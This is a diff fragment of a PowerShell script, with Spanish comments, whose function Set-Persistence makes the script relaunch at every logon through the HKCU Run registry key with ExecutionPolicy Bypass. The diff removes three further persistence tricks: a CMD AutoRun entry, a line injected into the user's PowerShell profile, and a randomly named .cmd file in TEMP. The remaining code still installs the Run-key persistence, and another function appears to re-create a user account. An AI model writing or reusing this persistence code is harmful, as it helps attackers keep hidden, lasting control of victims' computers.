@@ -41,26 +41,9 @@ function Check-And-RecreateUser {
 function Set-Persistence {
     try {
         $command = "powershell.exe -ExecutionPolicy Bypass -File `"$persistPath`""
-
-        # Método 1: Clave de Registro (Run Key)
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name "Persistence" -Value $command -ErrorAction Stop
 
-        # Método 2: AutoRun en CMD
-        New-ItemProperty -Path "HKCU:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value $command -PropertyType String -Force -ErrorAction Stop
-
-        # Método 3: Persistencia en perfil de PowerShell
-        $profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
-        New-Item -ItemType Directory -Path (Split-Path -Parent $profilePath) -Force
-        if (-not (Test-Path -Path $profilePath)) {
-            New-Item -ItemType File -Path $profilePath -Force
-        }
-        Add-Content -Path $profilePath -Value $command
-
-        # Método 4: Crear archivo .cmd en TEMP
-        $randomFileName = -join ((1..8) | ForEach-Object { ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')[(Get-Random -Maximum 62)] })
-        $startupFilePath = "$env:TEMP\$randomFileName.cmd"
-        Set-Content -Path $startupFilePath -Value $command
     } catch {
         Write-Host "Error en la persistencia: $_"
     }
